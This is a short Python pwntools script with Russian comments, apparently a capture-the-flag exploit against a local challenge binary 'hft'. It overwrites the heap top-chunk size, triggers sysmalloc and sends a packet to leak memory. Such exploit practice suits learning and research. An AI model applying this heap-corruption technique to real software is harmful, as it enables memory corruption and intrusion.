#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

print("[*] Запускаем hft локально...")
io = process('./hft')

# ШАГ 1: Базовая аллокация
io.recvuntil(b'PKT_RES')
io.send(p64(0x10))
io.sendline(p64(1)) # ECHO

# ШАГ 2: Перезапись размера Top Chunk
io.recvuntil(b'PKT_RES')
io.send(p64(0x10))
payload_overwrite = p64(1) + p64(0xd31)
io.sendline(payload_overwrite)

# ШАГ 3: Триггерим sysmalloc
io.recvuntil(b'PKT_RES')
io.send(p64(0x1000))
io.sendline(b"B"*0xf00)

# ШАГ 4: Утечка
io.recvuntil(b'PKT_RES')
io.send(p64(0x18))
io.sendline(b"\x01\x00\x00\x00\x00\x00\x00")

print("[*] Читаем ответ...")
res = io.recvall(timeout=2)
print(f"[+] Ответ: {res}")

io.close()
